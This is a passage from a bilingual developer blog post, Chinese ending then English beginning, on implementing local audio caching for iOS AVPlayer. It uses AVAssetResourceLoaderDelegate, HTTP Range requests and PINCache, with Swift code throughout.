#keyPath(AssetData.mediaData)) as? Data ?? Data() }}AssetData 存放： contentInformation : AssetDataContentInformationAssetDataContentInformation ：存放 是否支援 Range 範圍請求(isByteRangeAccessSupported)、資源總長度(contentLength)、檔案類型(contentType) mediaData : 原始音訊 Data （這邊檔案太大會 OOM）PINCacheAssetDataManager封裝 Data 存入、取出 PINCache 邏輯。import PINCacheimport Foundationprotocol AssetDataManager: NSObject { func retrieveAssetData() -&gt; AssetData? func saveContentInformation(_ contentInformation: AssetDataContentInformation) func saveDownloadedData(_ data: Data, offset: Int) func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data?}extension AssetDataManager { func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data? { if offset &lt;= from.count &amp;&amp; (offset + with.count) &gt; from.count { let start = from.count - offset var data = from data.append(with.subdata(in: start..&lt;with.count)) return data } return nil }}//class PINCacheAssetDataManager: NSObject, AssetDataManager { static let Cache: PINCache = PINCache(name: \"ResourceLoader\") let cacheKey: String init(cacheKey: String) { self.cacheKey = cacheKey super.init() } func saveContentInformation(_ contentInformation: AssetDataContentInformation) { let assetData = AssetData() assetData.contentInformation = contentInformation PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } func saveDownloadedData(_ data: Data, offset: Int) { guard let assetData = self.retrieveAssetData() else { return } if let mediaData = self.mergeDownloadedDataIfIsContinuted(from: assetData.mediaData, with: data, offset: offset) { assetData.mediaData = mediaData PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } } func retrieveAssetData() -&gt; AssetData? { guard let assetData = PINCacheAssetDataManager.Cache.object(forKey: cacheKey) as? AssetData else { return nil } return assetData }}這邊多抽出 Protocol 因為未來可能使用其他儲存方式替代 PINCache，所以其他程式在使用時是依賴 Protocol 而非 Class 實體。 ⚠️ mergeDownloadedDataIfIsContinuted 這個方法極其重要。照線性播放只要一直 append 新 Data 到 Cache Data 中即可，但現實情況複雜得多，使用者可能播了 Range 0~100，直接 Seek 到 Range 200–500 播放；如何將已有的 0-100 Data 與新的 200–500 Data 合併就是一個很大的問題。 ⚠️Data 合併有問題會出現可怕的播放鬼畜問題….這邊的答案是， 我們不處理非連續資料 ；因為敝專案僅為音訊，檔案也就幾 MB (≤ 10MB) 以考量開發成本就沒做了，我只處理合併連續的資料（例如目前已有 0~100，新資料是 75~200，合併之後變0~200；如果新資料是 150~200，我則會忽略不合併處理）如果要考慮非連續合併，除了在儲存上要使用其他方法（要有辦法辨識空缺部分）；在 Request 時也要能 Query 出哪段需要發網路請求去拿、哪段是從本地拿；要考量到這情況實作會非常複雜。圖片取自： iOS AVPlayer 视频缓存的设计与实现CachingAVURLAssetAVURLAsset 是 weak 持有 ResourceLoader Delegate，所以這邊建議自己建立一個 AVURLAsset Class 繼承自 AVURLAsset，在內部建立、賦予、持有 ResourceLoader ，讓他跟著 AVURLAsset 的生命週期；另外也可以儲存原始 URL、CacheKey 等資訊…。class CachingAVURLAsset: AVURLAsset { static let customScheme = \"cacheable\" let originalURL: URL private var _resourceLoader: ResourceLoader? var cacheKey: String { return self.url.lastPathComponent } static func isSchemeSupport(_ url: URL) -&gt; Bool { guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else { return false } return [\"http\", \"https\"].contains(components.scheme) } override init(url URL: URL, options: [String: Any]? = nil) { self.originalURL = URL guard var components = URLComponents(url: URL, resolvingAgainstBaseURL: false) else { super.init(url: URL, options: options) return } components.scheme = CachingAVURLAsset.customScheme guard let url = components.url else { super.init(url: URL, options: options) return } super.init(url: url, options: options) let resourceLoader = ResourceLoader(asset: self) self.resourceLoader.setDelegate(resourceLoader, queue: resourceLoader.loaderQueue) self._resourceLoader = resourceLoader }}使用：if CachingAVURLAsset.isSchemeSupport(url) { let asset = CachingAVURLAsset(url: url) let avplayer = AVPlayer(asset) avplayer.play()}其中 isSchemeSupport() 是用來判斷 URL 是否支援掛我們的 Resource Loader（排除 file:// ）。originalURL 存放原始資源 URL。cacheKey 存放這個資源的 Cache Key，這邊直接用檔案名稱當 Cache Key。cacheKey 請依照現實場景做調整，如果檔案名稱未 hash 可能重複就建議先 hash 後當 key 避免碰撞；如果要 hash 整個 URL 當 key 也要注意 URL 是否會變動 (例如有用 CDN)。Hash 可使用 md5…sha. .，iOS ≥ 13 可直接使用 Apple 的 CryptoKit ，其他就上 Github 找吧！ResourceLoaderRequestimport Foundationimport CoreServicesprotocol ResourceLoaderRequestDelegate: AnyObject { func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;)}class ResourceLoaderRequest: NSObject, URLSessionDataDelegate { struct RequestRange { var start: Int64 var end: RequestRangeEnd enum RequestRangeEnd { case requestTo(Int64) case requestToEnd } } enum RequestType { case contentInformation case dataRequest } struct ResponseUnExpectedError: Error { } private let loaderQueue: DispatchQueue let originalURL: URL let type: RequestType private var session: URLSession? private var dataTask: URLSessionDataTask? private var assetDataManager: AssetDataManager? private(set) var requestRange: RequestRange? private(set) var response: URLResponse? private(set) var downloadedData: Data = Data() private(set) var isCancelled: Bool = false { didSet { if isCancelled { self.dataTask?.cancel() self.session?.invalidateAndCancel() } } } private(set) var isFinished: Bool = false { didSet { if isFinished { self.session?.finishTasksAndInvalidate() } } } weak var delegate: ResourceLoaderRequestDelegate? init(originalURL: URL, type: RequestType, loaderQueue: DispatchQueue, assetDataManager: AssetDataManager?) { self.originalURL = originalURL self.type = type self.loaderQueue = loaderQueue self.assetDataManager = assetDataManager super.init() } func start(requestRange: RequestRange) { guard isCancelled == false, isFinished == false else { return } self.loaderQueue.async { [weak self] in guard let self = self else { return } var request = URLRequest(url: self.originalURL) self.requestRange = requestRange let start = String(requestRange.start) let end: String switch requestRange.end { case .requestTo(let rangeEnd): end = String(rangeEnd) case .requestToEnd: end = \"\" } let rangeHeader = \"bytes=\\(start)-\\(end)\" request.setValue(rangeHeader, forHTTPHeaderField: \"Range\") let session = URLSession(configuration: .default, delegate: self, delegateQueue: nil) self.session = session let dataTask = session.dataTask(with: request) self.dataTask = dataTask dataTask.resume() } } func cancel() { self.isCancelled = true } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data) { guard self.type == .dataRequest else { return } self.loaderQueue.async { self.delegate?.dataRequestDidReceive(self, data) self.downloadedData.append(data) } } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void) { self.response = response completionHandler(.allow) } func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) { self.isFinished = true self.loaderQueue.async { if self.type == .contentInformation { guard error == nil, let response = self.response as? HTTPURLResponse else { let responseError = error ?? ResponseUnExpectedError() self.delegate?.contentInformationDidComplete(self, .failure(responseError)) return } let contentInformation = AssetDataContentInformation() if let rangeString = response.allHeaderFields[\"Content-Range\"] as? String, let bytesString = rangeString.split(separator: \"/\").map({String($0)}).last, let bytes = Int64(bytesString) { contentInformation.contentLength = bytes } if let mimeType = response.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() { contentInformation.contentType = contentType as String } if let value = response.allHeaderFields[\"Accept-Ranges\"] as? String, value == \"bytes\" { contentInformation.isByteRangeAccessSupported = true } else { contentInformation.isByteRangeAccessSupported = false } self.assetDataManager?.saveContentInformation(contentInformation) self.delegate?.contentInformationDidComplete(self, .success(contentInformation)) } else { if let offset = self.requestRange?.start, self.downloadedData.count &gt; 0 { self.assetDataManager?.saveDownloadedData(self.downloadedData, offset: Int(offset)) } self.delegate?.dataRequestDidComplete(self, error, self.downloadedData) } } }}針對 Remote Request 的封裝，主要是服務 ResourceLoader 發起的資料請求。RequestType ：用來區分此 Request 是 第一次請求檔案資訊(contentInformation)、還是請求資料(dataRequest)RequestRange ：請求 Range 範圍，end 可指定到哪(requestTo(Int64) )或全部(requestToEnd)。檔案資訊可由：func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void)中取得 Response Header，另外要注意如果要改 HEAD 去摸，不會進這個要用其他方法接。 isByteRangeAccessSupported ：看 Response Header 中的 Accept-Ranges == bytes contentType ：播放器要的檔案類型資訊，格式是統一類識別符，不是 audio/mpeg ，而是寫作 public.mp3 contentLength ：看 Response Header 中的 Content-Range ：bytes 0–1/ 資源總長度 ⚠️這邊要注意伺服器給的格式大小寫，不一定是寫作 Accept-Ranges/Content-Range；有的伺服器的格式是小寫 accept-ranges、Accept-ranges…補充：如果要考量大小寫可以寫 HTTPURLResponse Extensionimport CoreServicesextension HTTPURLResponse { func parseContentLengthFromContentRange() -&gt; Int64? { let contentRangeKeys: [String] = [ \"Content-Range\", \"content-range\", \"Content-range\", \"content-Range\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString, let contentLengthString = rangeString.split(separator: \"/\").map({String($0)}).last, let contentLength = Int64(contentLengthString) else { return nil } return contentLength } func parseAcceptRanges() -&gt; Bool? { let contentRangeKeys: [String] = [ \"Accept-Ranges\", \"accept-ranges\", \"Accept-ranges\", \"accept-Ranges\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString else { return nil } return rangeString == \"bytes\" || rangeString == \"Bytes\" } func mimeTypeUTI() -&gt; String? { guard let mimeType = self.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() else { return nil } return contentType as String }}使用： contentLength = response.parseContentLengthFromContentRange( ) isByteRangeAccessSupported = response.parseAcceptRanges( ) contentType = response.mimeTypeUTI( )func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data)同前導知識所述，會實時取得已下載的資料，所以這個方法會一直進，片段片段的拿到 Data；我們將他 append 進 downloadedData 存放。func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?)任務取消或結束時都會進這個方法，在這將已下載的資料保存下來。如前導知識中提到的 Cancel 機制，因播放器在拿到足夠資料後就會發起 Cancel，Cancel Request；所以進到這個方法時實際會是 error = NSURLErrorCancelled ，因此不管 error 我們有拿到資料都會嘗試存下來。 ⚠️ 因 URLSession 會用並行方式出去請求資料，所以請保持操作都在DispatchQueue裡，避免資料錯亂(資料錯亂一樣會出現可怕的播放鬼畜)。 ️️⚠️URLSession 沒有呼叫 finishTasksAndInvalidate 或 invalidateAndCancel 兩個方法都會強持有物件導致 Memory Leak；所以不管是取消或是完成我們都要呼叫，這樣才能在任務結束釋放 Request。 ️️⚠️️️️️️️️️️️如果怕 downloadedData OOM，可以在 didReceive Data 中就存入本地。ResourceLoaderimport AVFoundationimport Foundationclass ResourceLoader: NSObject { let loaderQueue = DispatchQueue(label: \"li.zhgchg.resourceLoader.queue\") private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] private let cacheKey: String private let originalURL: URL init(asset: CachingAVURLAsset) { self.cacheKey = asset.cacheKey self.originalURL = asset.originalURL super.init() } deinit { self.requests.forEach { (request) in request.value.cancel() } }}extension ResourceLoader: AVAssetResourceLoaderDelegate { func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; Bool { let type = ResourceLoader.resourceLoaderRequestType(loadingRequest) let assetDataManager = PINCacheAssetDataManager(cacheKey: self.cacheKey) if let assetData = assetDataManager.retrieveAssetData() { if type == .contentInformation { loadingRequest.contentInformationRequest?.contentLength = assetData.contentInformation.contentLength loadingRequest.contentInformationRequest?.contentType = assetData.contentInformation.contentType loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = assetData.contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() return true } else { let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) if assetData.mediaData.count &gt; 0 { let end: Int64 switch range.end { case .requestTo(let rangeEnd): end = rangeEnd case .requestToEnd: end = assetData.contentInformation.contentLength } if assetData.mediaData.count &gt;= end { let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;Int(end)) loadingRequest.dataRequest?.respond(with: subData) loadingRequest.finishLoading() return true } else if range.start &lt;= assetData.mediaData.count { // has cache data...but not enough let subEnd = (assetData.mediaData.count &gt; end) ? Int((end)) : (assetData.mediaData.count) let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;subEnd) loadingRequest.dataRequest?.respond(with: subData) } } } } let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) let resourceLoaderRequest = ResourceLoaderRequest(originalURL: self.originalURL, type: type, loaderQueue: self.loaderQueue, assetDataManager: assetDataManager) resourceLoaderRequest.delegate = self self.requests[loadingRequest]?.cancel() self.requests[loadingRequest] = resourceLoaderRequest resourceLoaderRequest.start(requestRange: range) return true } func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest) { guard let resourceLoaderRequest = self.requests[loadingRequest] else { return } resourceLoaderRequest.cancel() requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader: ResourceLoaderRequestDelegate { func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } switch result { case .success(let contentInformation): loadingRequest.contentInformationRequest?.contentType = contentInformation.contentType loadingRequest.contentInformationRequest?.contentLength = contentInformation.contentLength loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() case .failure(let error): loadingRequest.finishLoading(with: error) } } func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.dataRequest?.respond(with: data) } func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.finishLoading(with: error) requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader { static func resourceLoaderRequestType(_ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestType { if let _ = loadingRequest.contentInformationRequest { return .contentInformation } else { return .dataRequest } } static func resourceLoaderRequestRange(_ type: ResourceLoaderRequest.RequestType, _ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestRange { if type == .contentInformation { return ResourceLoaderRequest.RequestRange(start: 0, end: .requestTo(1)) } else { if loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestToEnd) } else { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 let length = Int64(loadingRequest.dataRequest?.requestedLength ?? 1) let upperBound = lowerBound + length return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestTo(upperBound)) } } }}loadingRequest.contentInformationRequest != nil 則代表是第一次請求，播放器要求先給檔案資訊。請求檔案資訊時我們需要賦予這三項資訊： loadingRequest.contentInformationRequest?.isByteRangeAccessSupported ：是否支援 Range 拿 Data loadingRequest.contentInformationRequest?.contentType ：統一類識別符 loadingRequest.contentInformationRequest?.contentLength ：檔案總長度 Int64loadingRequest.dataRequest?.requestedOffset 可取得要求 Range 的起始 offset。loadingRequest.dataRequest?.requestedLength 可取得要求 Range 的長度。loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true 則不管要求 Range 的長度，直接拿到底。loadingRequest.dataRequest?.respond(with: Data) 返回已載入的 Data 給播放器。loadingRequest.dataRequest?.currentOffset 可取得當前 data offset， dataRequest?.respond(with: Data) 後 currentOffset 會跟著推移。loadingRequest.finishLoading() 資料都載完了，告知播放器。func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; Bool播放器請求資料，我們先看本地 Cache 有無資料，有則返回；若只有部分資料則一樣返回部分，例如我本地有 0–100 ，播放器要求 0–200，則先返回 0–100。若沒有本地 Cache、返回的資料不夠，則會發起 ResourceLoaderRequest 請求從網路拿資料。func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest)播放器取消請求，取消 ResourceLoaderRequest。 你可能有發現 resourceLoaderRequestRange 的 offset 是看 currentOffset ，因為我們會先從本地 dataRequest?.respond(with: Data) 已下載 Data；所以直接看推移後的 offset 即可。func private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] ⚠️ requests 有的範例是只用 currentRequest: ResourceLoaderRequest 來存放，這會有個問題，因為可能當前的 request 正在拿取，使用者又 seek 這時會取消舊的發起新的；但因不一定會照順序發生，可能先走發新請求再走取消；所以用 Dictionary 去存取操作還是比較安全！ ⚠️讓所有操作都在同個 DispatchQueue 防止出現資料鬼畜。deinit 時取消所有還在請求的 requests Resource Loader Deinit 即代表 AVURLAsset Deinit，代表播放器已經不需要這個資源了；所以我們可以 Cancel 還在取資料的 Request，已經載的一樣會寫入 Cache。補充及鳴謝感謝 Lex 汤 大大指點。感謝 外孫女 提供開發上的意見及支持。本篇只針對音樂小檔影片大檔案可能會在 downloadedData、AssetData/PINCacheAssetDataManager 發生 Out Of Memory 問題。同前述，如果要解決這個問題請使用 fileHandler seek read/wirte 去操作本地 Cache 讀取寫入（取代AssetData/PINCacheAssetDataManager）；或找看看 Github 有沒有大 data write/read to file 的專案可用。AVQueuePlayer 切換播放項目時取消正在下載的項目同前導知識中所述，在更換播放目標時是不會發起 Cancel 的；如果是 AVPlayer 會走 AVURLAsset Deinit 所以下載也會中斷；但 AVQueuePlayer 不會，因為都還在 Queue 裡，只是播放目標換到下一首而已。這邊唯一做法就只能接收變換播放目標通知，然後在收到通知後取消上一手的 AVURLAsset loading。asset.cancelLoading()音訊資料加解密音訊加解密可在 ResourceLoaderRequest 中拿到 Data 進行、還有儲存時能在 AssetData 的 encode/decode 對存在本地的 Data進行加解密。CryptoKit SHA 使用範本：class AssetData: NSObject, NSCoding { static let encryptionKeyString = \"encryptionKeyExzhgchgli\" ... func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) if #available(iOS 13.0, *), let encryptionData = try? ChaChaPoly.seal(self.mediaData, using: AssetData.encryptionKey).combined { coder.encode(encryptionData, forKey: #keyPath(AssetData.mediaData)) } else { // } } required init?(coder: NSCoder) { super.init() ... if let mediaData = coder.decodeObject(forKey: #keyPath(AssetData.mediaData)) as? Data { if #available(iOS 13.0, *), let sealedBox = try? ChaChaPoly.SealedBox(combined: mediaData), let decryptedData = try? ChaChaPoly.open(sealedBox, using: AssetData.encryptionKey) { self.mediaData = decryptedData } else { // } } else { // } }}PINCache 相關操作PINCache 包含 PINMemoryCache 和 PINDiskCache，PINCache 會幫我們處理從檔案讀到 Memory 或從 Memory 寫入檔案的事，我們只需要對 PINCache 進行操作。在模擬器中查找 Cache 檔案位置：使用 NSHomeDirectory() 取得模擬器檔案路徑Finder -&gt; 前往 -&gt; 貼上路徑在 Library -&gt; Caches -&gt; com.pinterest.PINDiskCache.ResourceLoader 就是我們建的 Resource Loader Cache 目錄。PINCache(name: “ResourceLoader”) 其中的 name 就是目錄名稱。也可以指定 rootPath ，目錄就可以改到 Documents 底下（不怕被系統清掉）。設定 PINCache 最大上限： PINCacheAssetDataManager.Cache.diskCache.byteCount = 300 * 1024 * 1024 // max: 300mb PINCacheAssetDataManager.Cache.diskCache.byteLimit = 90 * 60 * 60 * 24 // 90 days系統預設上限設 0 的話就不會主動刪除檔案。後記原先太小看這個功能的困難度，以為三兩下就能處理好；結果吃盡苦頭，大概又多花了兩週處理資料儲存的問題，不過也就此徹底了解整個 Resource Loader 運作機制、 GCD 、Data。參考資料最後附上研究如何實作的參考資料 iOS AVPlayer 视频缓存的设计与实现 僅講原理 基于AVPlayer实现音视频播放和缓存，支持视频画面的同步输出 [ SZAVPlayer ] 有附程式（很完整，但很複雜） CachingPlayerItem （簡易實現，較好懂但不完整） 可能是目前最好的 AVPlayer 音视频缓存方案 AVAssetResourceLoaderDelegate 仿抖音 Swift 版 [ Github ]（蠻有意思的專案，復刻抖音 APP；裡面也有用到 Resource Loader） iOS HLS Cache 實踐方法探究之旅延伸 DLCachePlayer (Objective-C 版)有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 5,099 Total Views Last Statistics Date: 2025-08-15 | 4,896 Views on Medium." }, { "title": "Complete Guide to Implementing Local Cache Functionality with AVPlayer", "url": "/posts/zrealm-dev/en/complete-guide-to-implementing-local-cache-functionality-with-avplayer-6ce488898003/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, cache, avplayer, music-player-app", "date": "2021-01-31 18:41:42 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Complete Guide to Implementing Local Cache Functionality with AVPlayerImplementing A...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Complete Guide to Implementing Local Cache Functionality with AVPlayerImplementing AVPlayer/AVQueuePlayer with AVURLAsset and AVAssetResourceLoaderDelegatePhoto by Tyler Lastovich[2023/03/12] UpdateI have open-sourced my previous implementation, so friends in need can use it directly. Customizable cache strategies, can use PINCache or others… Externally, just call the make AVAsset factory with the URL, and the AVAsset will support caching. Implemented data flow strategy using Combine. Wrote some tests.IntroductionIt has been over half a year since the last article, “Exploring iOS HLS Cache Implementation Methods,” and our team has been eager to implement the functionality of streaming while caching due to its significant impact on costs. We are a music streaming platform, and if we have to retrieve the entire file every time the same song is played, it is detrimental to both us and users who are not on unlimited plans. Although music files are usually just a few MB, every little bit adds up!Additionally, since Android has already implemented streaming while caching, we have compared costs, and after the Android version went live, we clearly saved a lot of bandwidth; therefore, we expect even better bandwidth management for the larger iOS user base.Based on the experience from the previous article, if we continue to use HLS (*.m3u8/*.ts) to achieve our goal, things will become very complicated, if not impossible. We decided to revert to using mp3 files, which allows us to directly implement AVAssetResourceLoaderDelegate.Goals Music that has been played will generate a local cache backup. When playing music, first check if there is a cache locally; if so, do not request the file from the server again. Cache strategies can be set; total capacity limits, and when exceeded, the oldest cache files will be deleted. Do not interfere with the original AVPlayer playback mechanism.(Otherwise, the fastest method would be to use URLSession to download the mp3 file and feed it to AVPlayer, but that would lose the functionality of streaming as needed, requiring users to wait longer and consuming more bandwidth.)Prerequisite Knowledge (1)— HTTP/1.1 Range Requests, Connection Keep-AliveHTTP/1.1 Range RequestsFirst, we need to understand how data is requested from the server when playing videos or music. Generally, video and music files are large, and it is not feasible to wait until the entire file is downloaded before starting playback. The common approach is to play as data is received; as long as there is data for the currently playing segment, it can function.The way to achieve this functionality is through HTTP/1.1 Range requests, which only return the specified byte range of data. For example, specifying 0–100 will only return 100 bytes of data from 0 to 100. This method allows for sequentially obtaining data in segments, which can then be assembled into a complete file. This method can also be applied to file download resumption functionality.How to Apply?We will first use HEAD to check the response header to understand whether the server supports range requests, the total length of the resource, and the file type:curl -i -X HEAD http://zhgchg.li/music.mp3Using HEAD, we can obtain the following information from the response header: Accept-Ranges: bytes indicates that the server supports range requests. If this value is absent or if it is Accept-Ranges: none, it means it does not support range requests. Content-Length: the total length of the resource; we need to know the total length to segment the data requests. Content-Type: the file type, which is information that AVPlayer needs during playback.However, sometimes we also use GET with Range: bytes=0–1, meaning we request data in the range of 0–1, but we do not actually care about the content of 0–1; we just want to see the information in the response header. The native AVPlayer uses GET to check, so this article will also follow suit. However, it is recommended to use HEAD for checking, as it is a more accurate method. On the other hand, if the server does not support range functionality, using GET will force a complete file download.curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–1\"Using GET, we can obtain the following information from the response header: Accept-Ranges: bytes indicates that the server supports range requests. If this value is absent or if it is Accept-Ranges: none, it means it does not support range requests. Content-Range: bytes 0–1/total length indicates the total length of the resource after the “/”; we need to know the total length to segment the data requests. Content-Type: the file type, which is information that AVPlayer needs during playback.Once we know that the server supports range requests, we can start making segmented range requests:curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–100\"The server will return 206 Partial Content:Content-Range: bytes 0-100/total lengthContent-Length: 100...(binary content)At this point, we have obtained the data for range 0–100 and can continue to make new requests for ranges 100–200, 200–300, and so on until completion.If the requested range exceeds the total length of the resource, it will return 416 Range Not Satisfiable.Additionally, to obtain the complete file data, we can request Range 0–total length or simply use 0–:curl -i -X GET http://zhgchg.li/music.mp3 -H \"Range: bytes=0–\"Other requests can also specify multiple range data and conditions, but we will not use those; for details, please refer to this.Connection Keep-AliveHTTP/1.1 is enabled by default, and this feature allows for real-time retrieval of downloaded data. For example, a 5 MB file can be retrieved in chunks of 16 KB, 16 KB, 16 KB, etc., without having to wait for the entire 5 MB to be ready.Connection: Keep-AliveWhat if the server does not support Range or Keep-Alive? In that case, there is no need to complicate things; just use URLSession to download the mp3 file and feed it to the player… But that is not the result we want, so we can ask the backend to modify the server settings.Prerequisite Knowledge (2) — How does AVPlayer natively handle AVURLAsset resources?When we use AVURLAsset initialized with a URL resource and assign it to AVPlayer/AVQueuePlayer to start playback, as mentioned above, it will first use GET Range 0–1 to obtain whether range requests are supported, the total length of the resource, and the file type.After obtaining the file information, a second request will be made to request data from 0 to total length. ⚠️ AVPlayer will request data from 0 to total length and will use the real-time retrieval of downloaded data feature (16 KB, 16 KB, 16 KB…) to obtain enough data before it will issue a cancel to terminate this network request (so it will not actually retrieve everything unless the file is very small). Subsequent playback will then request data further along using range requests. (This part is different from what I previously thought; I assumed it would request 0–100, 100–200, etc.)AVPlayer Request Example:1. GET Range 0-1 =&gt; Response: total length 150000 / public.mp3 / true2. GET 0-150000...3. 16 KB received4. 16 KB received...5. cancel() // current offset is 7006. Continue playback7. GET 700-150000...8. 16 KB received9. 16 KB received...10. cancel() // current offset is 150011. Continue playback12. GET 1500-150000...13. 16 KB received14. 16 KB received...16. If seek to...500017. cancel(12.) // current offset is 200018. GET 5000-150000...19. 16 KB received20. 16 KB received...... ⚠️ In iOS ≤12, it will first issue a few shorter requests to probe (?), and then it will issue a request for the total length; in iOS ≥ 13, it will directly issue a request for the total length.There is also an unrelated pitfall; while observing how resources are fetched, I used the mitmproxy tool to sniff the traffic, and I found that it displayed an error, waiting until the entire response came back before showing it, rather than displaying it in segments and continuing the download using persistent connections; it startled me! I thought iOS was so inefficient that it had to download the entire file each time! Next time I use a tool, I need to maintain a bit of skepticism.Timing of Cancel Requests The second request mentioned earlier, which requests resources from 0 to total length, will issue a cancel request once sufficient data has been received. During seeking, a cancel request will be issued for the previous request. ⚠️ In AVQueuePlayer, switching to the next resource or changing the playback resource in AVPlayer will not issue a cancel request for the previous one.AVQueue Pre-bufferingThis also calls the Resource Loader, but it requests a smaller range of data.ImplementationWith the above prerequisite knowledge, let’s look at how to implement the local cache functionality for AVPlayer.This involves the previously mentioned AVAssetResourceLoaderDelegate, which allows us to implement our own Resource Loader for the asset.The Resource Loader is essentially a worker; whether the player needs file information or file data, and what ranges are needed, it informs us, and we take action accordingly. I have seen examples where a Resource Loader serves all AVURLAssets, but I believe this is incorrect; there should be one Resource Loader serving one AVURLAsset, following the lifecycle of the AVURLAsset, as it inherently belongs to the AVURLAsset. Having one Resource Loader serve all AVURLAssets in AVQueuePlayer would become very complex and difficult to manage.Timing for Entering Custom Resource LoaderIt is important to note that simply implementing your own Resource Loader does not mean it will be used; it will only be invoked when the system cannot recognize or handle the resource.Therefore, before providing the URL resource to AVURLAsset, we need to change the scheme to our custom scheme, which cannot be http/https or any other scheme that the system can handle.http://zhgchg.li/music.mp3 =&gt; cacheable://zhgchg.li/music.mp3AVAssetResourceLoaderDelegateOnly two methods need to be implemented: func resourceLoader( _ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest : AVAssetResourceLoadingRequest) -&gt; Bool :This method asks us whether we can handle this resource; returning true means we can, and returning false means we do not handle it (unsupported URL).From loadingRequest, we can extract what is being requested (whether it is the first request for file information or a request for data, and if it is a data request, what the range is); knowing the request, we can initiate our own request to fetch the data. At this point, we can decide whether to initiate a URLSession request or return data from local storage.We can also perform data encryption and decryption operations here to protect the original data. func resourceLoader( _ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest : AVAssetResourceLoadingRequest) :As mentioned earlier, when a cancel request is issued…We can cancel any ongoing URLSession requests here.Local Cache ImplementationFor caching, I directly use PINCache to handle cache operations, eliminating the need for us to manage cache read/write deadlocks and implement LRU cache clearing strategies. ️️⚠️️️️️️️️️️️OOM Warning! Since this is aimed at caching music files, which are typically around 10 MB, we can use PINCache as a local caching tool; however, this method cannot be used for video services (which may require loading several GB of data into memory at once).For those with similar needs, you can refer to the approach of using FileHandle seek read/write features for handling this.Let’s Get Started!Without further ado, here is the complete project:AssetDataThe local cache data object implements NSCoding, as PINCache relies on the archivedData method for encoding/decoding.import Foundationimport 